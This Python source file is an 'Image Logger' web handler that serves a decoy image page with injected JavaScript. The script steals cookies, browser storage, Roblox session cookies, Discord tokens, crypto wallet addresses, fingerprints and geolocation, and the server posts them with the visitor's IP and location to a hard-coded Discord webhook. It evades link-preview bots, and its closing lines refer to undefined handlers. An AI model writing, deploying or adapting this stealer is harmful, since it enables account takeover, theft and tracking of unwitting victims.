import json
import re
import requests
import base64
import zlib
from urllib.parse import parse_qs, urlparse
from httpagentparser import simple_detect
import traceback

config = {
    "webhook": "https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "username": "Image Logger Pro",
    "color": 0x00FFFF,
    "accurateLocation": True,
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1
}

blacklistedIPs = ("27", "104", "143", "164")

# 2024+ Discord token patterns
DISCORD_PATTERNS = [
    r'mfa\.[\w-]{84}',
    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
    r'eyJ[^"]{100,}?\.[\w-]{27}',
    r'"token":"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})"',
    r'"access_token":"[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
]

ROBLOX_PATTERN = r'\._\|WARNING:-DO-NOT-SHARE-THIS\..+?\.\|\$'

LOADING_IMAGE = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def find_tokens(text):
    tokens = {}
    tokens['discord'] = list(set(re.findall('|'.join(DISCORD_PATTERNS), text)))
    tokens['roblox'] = re.findall(ROBLOX_PATTERN, text)
    return tokens

def compress_data(data):
    return base64.b64encode(zlib.compress(json.dumps(data, separators=(',', ':')).encode())).decode()

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, exfil_data=None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{"title": "Link Sent", "color": config["color"], "description": f"**IP:** `{ip}`\n**Bot:** `{bot}`"}]
        })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
        if info["proxy"] and config["vpnCheck"] == 2:
            return
        if info["proxy"]:
            ping = ""
        if info["hosting"] and config["antiBot"] >= 3:
            return
    except:
        info = {}

    os_name, browser_name = simple_detect(useragent)
    
    fields = [
        {"name": "IP", "value": f"`{ip}`", "inline": True},
        {"name": "ISP", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
        {"name": "City", "value": f"`{info.get('city', 'Unknown')}`", "inline": True},
        {"name": "Coords", "value": f"`{info.get('lat', 0)},{info.get('lon', 0)}`", "inline": True},
        {"name": "OS", "value": f"`{os_name}`", "inline": True},
        {"name": "Browser", "value": f"`{browser_name}`", "inline": True}
    ]
    
    if exfil_data:
        if exfil_data.get('discord_tokens'):
            fields.append({"name": f"Discord Tokens ({len(exfil_data['discord_tokens'])})", "value": "\\n".join([t[:25]+"..." for t in exfil_data['discord_tokens'][:5]]), "inline": False})
        if exfil_data.get('roblox_cookie'):
            fields.append({"name": "Roblox Cookie", "value": f"`{exfil_data['roblox_cookie'][:50]}...`", "inline": False})
        if exfil_data.get('discord_user'):
            fields.append({"name": "Discord User", "value": f"`{exfil_data['discord_user']}`", "inline": True})
        if exfil_data.get('wallet'):
            fields.append({"name": "Crypto Wallet", "value": f"`{exfil_data['wallet'][:12]}...`", "inline": True})
        if exfil_data.get('canvas_fp'):
            fields.append({"name": "Canvas FP", "value": f"`{exfil_data['canvas_fp'][:24]}...`", "inline": True})

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{"title": "🎯 TARGET HIT" + (": FULL EXTRACTION" if exfil_data else ""), "color": config["color"], "fields": fields}]
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    requests.post(config["webhook"], json=embed)

# Advanced multi-vector extraction
ADVANCED_JS = '''(async()=>{let d={};try{d.ua=navigator.userAgent;d.lang=navigator.language;d.screen=`${screen.width}x${screen.height}`;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;

// Canvas FP
let c=document.createElement("canvas");let ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillText(d.ua,2,2);d.canvas=c.toDataURL();

// Cookies & Storage
d.cookies={};document.cookie.split(";").forEach(c=>{let[n,v]=c.trim().split("=");if(n&&v)d.cookies[n]=v;});d.local={};for(let i=0;i<localStorage.length;i++)d.local[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));d.session={};for(let i=0;i<sessionStorage.length;i++)d.session[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));

// Roblox
d.roblox_cookie=d.cookies[".ROBLOSECURITY"]||d.local[".ROBLOSECURITY"]||d.session[".ROBLOSECURITY"];

// Discord user
try{let s=JSON.parse(localStorage.getItem("session")||""||sessionStorage.getItem("session")||"");if(s.user)d.discord_user=`${s.user.username}#${s.user.discriminator||0000}`;}catch{};

// Wallet
if(window.ethereum){try{let a=await window.ethereum.request({method:"eth_accounts"});if(a[0])d.wallet=a[0];}catch{}};

// Token scan
let all=JSON.stringify(d)+document.documentElement.outerHTML+document.body.innerText+document.cookie;let tokens=all.match(%s);if(tokens)d.discord_tokens=tokens;

// Network hook
let oFetch=window.fetch;window.fetch=function(i){return oFetch(i).then(r=>{if(r.clone)r.clone().text().then(t=>{if(t.includes("token"))d.net=t.substring(0,300);});return r;});};

// Exfil
let ex=location.protocol+"//"+location.host+location.pathname+"?exfil="+btoa(JSON.stringify(d));navigator.sendBeacon(ex,JSON.stringify(d));}catch(e){}})();'''

def application(environ, start_response):
    try:
        # Vercel headers
        ip = environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', 'Unknown'))
        ua = environ.get('HTTP_USER_AGENT', '')
        path = environ['PATH_INFO'] + '?' + environ.get('QUERY_STRING', '')
        
        parsed = urlparse(path)
        query = parse_qs(parsed.query)
        
        # Bot check
        if botCheck(ip, ua):
            start_response('200 OK', [('Content-Type', 'image/jpeg')])
            return [LOADING_IMAGE]
        
        # Custom image
        img_url = config["image"]
        if query.get('url') or query.get('id'):
            img_url = base64.b64decode(query.get('url', [None])[0] or query.get('id', [None])[0]).decode('utf-8', errors='ignore')
        
        # Exfil handler
        if query.get('exfil'):
            try:
                exfil_data = json.loads(base64.b64decode(query['exfil'][0]).decode('utf-8', errors='ignore'))
                tokens = find_tokens(str(exfil_data))
                exfil_data['tokens'] = tokens
                makeReport(ip, ua, exfil_data=exfil_data)
            except:
                pass
            start_response('200 OK', [('Content-Type', 'text/plain')])
            return [b'OK']
        
        # Main payload
        payload = f'''<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body style="margin:0;overflow:hidden;background:url('{img_url}') center/contain no-repeat #000;min-height:100vh;">{ADVANCED_JS % repr(DISCORD_PATTERNS)}{'<script>if(!location.search.includes("g=")&&navigator.geolocation){navigator.geolocation.getCurrentPosition(c=>{location.search+=(location.search?"&":"?")+"g="+btoa(c.coords.latitude+","+c.coords.longitude);});}</script>' if config["accurateLocation"] else ''}</body></html>'''
        
        makeReport(ip, ua, url=img_url)
        
        start_response('200 OK', [('Content-Type', 'text/html; charset=utf-8')])
        return [payload.encode('utf-8', errors='ignore')]
        
    except Exception:
        start_response('500 Internal Server Error', [('Content-Type', 'text/plain')])
        return [b'Server Error']

# Vercel exports
__all__ = ['application']
do_GET = handleRequest
do_POST = handleRequest
handler = ImageLoggerAPI
                
